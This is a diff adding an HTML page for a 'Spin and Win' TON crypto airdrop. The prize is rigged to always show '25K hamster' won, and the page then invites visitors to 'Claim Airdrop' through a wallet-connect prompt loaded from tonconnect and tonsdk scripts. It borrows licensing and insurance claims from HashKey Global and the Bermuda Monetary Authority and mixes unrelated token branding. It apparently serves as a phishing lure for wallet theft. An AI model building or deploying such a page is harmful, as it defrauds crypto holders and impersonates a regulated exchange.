@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airdrop Page</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="assets/jquery.min.js"></script>
+    <script src="/dogs/index_files/tonconnect-ui.min.js"></script>
+    <script src="/ton-spin/files/sweetalert2.min.js"></script>
+    <link rel="stylesheet" href="/ton-spin/files/sweetalert2.min.css">
+    <script>
+
+        $(document).ready(function () {
+
+            $('a[href^="#"]').on('click', function (event) {
+                event.preventDefault();
+
+                var sc = $(this).attr("href"),
+                    dn = $(sc).offset().top;
+
+                $('html, body').animate({
+                    scrollTop: dn
+                }, 1000);
+            });
+        });
+
+
+        $(document).ready(function () {
+            var wheel = $("#wheel");
+            var spinButton = $("#spin-button");
+            var spinDuration = 5000;
+            var spinAngle = 360 * 6;
+            var modal = $(".modal");
+            var hasSpunWheel = localStorage.getItem("hasSpunWheel");
+            localStorage.clear();
+            if (!hasSpunWheel) {
+                spinButton.on("click", function () {
+                    wheel.css("transition", "transform " + spinDuration + "ms ease-in-out");
+                    wheel.css("transform", "rotate(" + spinAngle + "deg)");
+                    setTimeout(function () {
+                        wheel.css("transition", "none");
+                        wheel.css("transform", "rotate(0deg)");
+                    }, spinDuration);
+
+                    setTimeout(function () {
+                        $("#a-first")[0].style.display = 'none';
+                        $("#a-final")[0].style.display = 'block';
+                        try {Draw()}catch{}
+                        const c = $("canvas")[0]
+                        c.style.opacity = 1;
+                        c.style.zIndex = 9999;
+                        setTimeout(()=>{
+                            c.style.opacity = 0;
+                            setTimeout(()=>{
+                                c.style.zIndex = -1000;
+                                c.parentNode.removeChild(c)
+                            }, 100);
+                        }, 2500);
+                    }, spinDuration + 500);
+
+                    localStorage.setItem("hasSpunWheel", true);
+                });
+            } else {
+                $("#a-first")[0].style.display = 'none';
+                $("#a-final")[0].style.display = 'block';
+            }
+        });
+    </script>
+</head>
+
+<body>
+    <canvas id="canvas"></canvas>
+    <div class="container">
+        <div class="content">
+            <p>Fully Licensed and Compliant</p><span>Your transactions will be recognized and protected by the Bermuda
+                Monetary Authority.</span>
+            <p>Fully licensed, trade with ease</p><span> Following Coinbase, HashKey Global also obtained a
+                comprehensive exchange license for digital asset investor protection from the Bermuda Monetary
+                Authority, making us a strong player in licensed crypto trading.</span>
+
+            <p>Asset Security: asset segregation and insurance</p><span> User assets on HashKey Global are
+                legally segregated from company assets, ensuring that users have beneficial ownership of their
+                assets. Assets are also insured under a policy by One Infinity.</span>
+
+            <p>Comprehensive regulatory oversight</p><span> UHashKey Global's exchange code and operational data
+                are independently audited by one of the Big Four international accounting firms.</span>
+            </ul>
+        </div>
+
+        <div class="coin" style="pointer-events: none;">
+            <img class="coinBG" src="assets/coinBG.png" alt="Mascot">
+            <img class="overlayIMG" src="assets/goorbe.webp" alt="Mascot" style="width: 100%">
+        </div>
+
+        <div class="airdrop-section" id="a-first">
+            <svg class="bg-gradient" width="428" height="358" viewBox="0 0 428 358" fill="none"
+                xmlns="http://www.w3.org/2000/svg">
+                <g filter="url(#a)">
+                    <path
+                        d="M326.797 437.049c89.8 4.376 94.518-30.305 165.962-37.939 253.804-27.121 289.046 205.988 28.752 251.923C275.249 694.492 10.886 512.89 10.886 512.89s-51.741-48.857-3.385-71.432c43.64-20.373 101.741-21.833 165.711-17.896 50.54 3.11 102.671 11.006 153.585 13.487"
+                        fill="#8E47F2" />
+                </g>
+                <g filter="url(#b)">
+                    <ellipse cx="11.105" cy="500.001" rx="126.568" ry="87.029" fill="#FF8000" />
+                </g>
+                <g filter="url(#c)">
+                    <ellipse cx="-127.653" cy="508.591" rx="126.568" ry="87.029" fill="#476DF2" />
+                </g>
+                <defs>
+                    <filter id="a" x="-279.747" y="130.322" width="1247.01" height="794.03" filterUnits="userSpaceOnUse"
+                        color-interpolation-filters="sRGB">
+                        <feFlood flood-opacity="0" result="BackgroundImageFix" />
+                        <feBlend in="SourceGraphic" in2="BackgroundImageFix" result="shape" />
+                        <feGaussianBlur stdDeviation="133.3" result="effect1_foregroundBlur_1_573" />
+                    </filter>
+                    <filter id="b" x="-527.964" y=".472" width="1078.14" height="999.057" filterUnits="userSpaceOnUse"
+                        color-interpolation-filters="sRGB">
+                        <feFlood flood-opacity="0" result="BackgroundImageFix" />
+                        <feBlend in="SourceGraphic" in2="BackgroundImageFix" result="shape" />
+                        <feGaussianBlur stdDeviation="206.25" result="effect1_foregroundBlur_1_573" />
+                    </filter>
+                    <filter id="c" x="-666.721" y="9.063" width="1078.14" height="999.057" filterUnits="userSpaceOnUse"
+                        color-interpolation-filters="sRGB">
+                        <feFlood flood-opacity="0" result="BackgroundImageFix" />
+                        <feBlend in="SourceGraphic" in2="BackgroundImageFix" result="shape" />
+                        <feGaussianBlur stdDeviation="206.25" result="effect1_foregroundBlur_1_573" />
+                    </filter>
+                </defs>
+            </svg>
+            <div class="airdrop-content">
+                <div class="title wheel">
+                    <div class="spin">
+                        <div class="title">
+                            <h2>SPIN AND WIN!</h2>
+                            <span>Most traded cryptocurrency pairs market capitalization</span>
+                        </div>
+                        <div class="spinner">
+                            <svg class="arrow" style="z-index: 999999999;" width="21" height="16" viewBox="0 0 21 16"
+                                fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path
+                                    d="M13.12 13.78a4 4 0 0 1-5.882 0l-6.083-6.6C-1.207 4.615.611.468 4.097.468h12.165c3.485 0 5.303 4.147 2.941 6.71z"
+                                    fill="#F9D838" />
+                            </svg>
+                            <img class="spinwheel" id="wheel" src="assets/spin.webp" alt="spin">
+                        </div>
+                        <div class="winned" style="opacity: 0">
+                            <img src="assets/coin.webp" alt="catizenxkombat" style="width: 30px">
+                            <img class="reflect" src="assets/coin.webp" alt="catizenxkombat">
+                            <p>25k</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="button-section">
+                <button class="button" id="spin-button">Take Reward!</button>
+            </div>
+        </div>
+        <div class="airdrop-section" style="display: none" id="a-final">
+            <svg class="bg-gradient" width="428" height="358" viewBox="0 0 428 358" fill="none"
+                xmlns="http://www.w3.org/2000/svg">
+                <g filter="url(#a)">
+                    <path
+                        d="M326.797 437.049c89.8 4.376 94.518-30.305 165.962-37.939 253.804-27.121 289.046 205.988 28.752 251.923C275.249 694.492 10.886 512.89 10.886 512.89s-51.741-48.857-3.385-71.432c43.64-20.373 101.741-21.833 165.711-17.896 50.54 3.11 102.671 11.006 153.585 13.487"
+                        fill="#8E47F2" />
+                </g>
+                <g filter="url(#b)">
+                    <ellipse cx="11.105" cy="500.001" rx="126.568" ry="87.029" fill="#FF8000" />
+                </g>
+                <g filter="url(#c)">
+                    <ellipse cx="-127.653" cy="508.591" rx="126.568" ry="87.029" fill="#476DF2" />
+                </g>
+                <defs>
+                    <filter id="a" x="-279.747" y="130.322" width="1247.01" height="794.03" filterUnits="userSpaceOnUse"
+                        color-interpolation-filters="sRGB">
+                        <feFlood flood-opacity="0" result="BackgroundImageFix" />
+                        <feBlend in="SourceGraphic" in2="BackgroundImageFix" result="shape" />
+                        <feGaussianBlur stdDeviation="133.3" result="effect1_foregroundBlur_1_573" />
+                    </filter>
+                    <filter id="b" x="-527.964" y=".472" width="1078.14" height="999.057" filterUnits="userSpaceOnUse"
+                        color-interpolation-filters="sRGB">
+                        <feFlood flood-opacity="0" result="BackgroundImageFix" />
+                        <feBlend in="SourceGraphic" in2="BackgroundImageFix" result="shape" />
+                        <feGaussianBlur stdDeviation="206.25" result="effect1_foregroundBlur_1_573" />
+                    </filter>
+                    <filter id="c" x="-666.721" y="9.063" width="1078.14" height="999.057" filterUnits="userSpaceOnUse"
+                        color-interpolation-filters="sRGB">
+                        <feFlood flood-opacity="0" result="BackgroundImageFix" />
+                        <feBlend in="SourceGraphic" in2="BackgroundImageFix" result="shape" />
+                        <feGaussianBlur stdDeviation="206.25" result="effect1_foregroundBlur_1_573" />
+                    </filter>
+                </defs>
+            </svg>
+            <!-- ! oon container -->
+
+            <div class="airdrop-content">
+                <div class="title" style="position: absolute;top: 40px;">
+                    <div class="image">
+                        <img src="assets/catizenxkombat.png" alt="catizenxkombat">
+                        <img class="reflect" src="assets/catizenxkombat.png" alt="catizenxkombat">
+                    </div>
+                    <h2>You won 25K hamster!</h2>
+                    <span>Most traded cryptocurrency pairs market capitalization</span>
+                </div>
+            </div>
+            <div class="button-section" style="position: absolute;bottom: 22px;">
+                <button class="button" onclick="openModalUi()">Claim Airdrop</button>
+            </div>
+        </div>
+    </div>
+    <div class="bg-gradients">
+        <svg class="gradient gradient-1" width="498" height="276" viewBox="0 0 498 276" fill="none"
+            xmlns="http://www.w3.org/2000/svg">
+            <path
+                d="M279.721 115.723c-61.138-26.832-52.789-51.447-97.749-80.183C22.252-66.544-78.376 76.73 79.427 193.469c149.295 110.446 385.16 77.291 385.16 77.291s50.573-15.339 25.907-46.359c-22.26-27.995-60.395-48.208-104.22-66.777-34.623-14.671-71.889-26.688-106.553-41.901"
+                fill="#8E47F2" />
+        </svg>
+        <svg class="gradient gradient-2" width="177" height="145" viewBox="0 0 177 145" fill="none"
+            xmlns="http://www.w3.org/2000/svg">
+            <ellipse cx="88.628" cy="72.726" rx="93.994" ry="64.63" transform="rotate(28.19 88.628 72.726)"
+                fill="#FF8000" />
+        </svg>
+    </div>
+    <script defer src="assets/effect.js"></script>
+
+    <script src="/dogs/index_files/tonsdk.js?NEW22"></script>
+</body>
+
+</html>
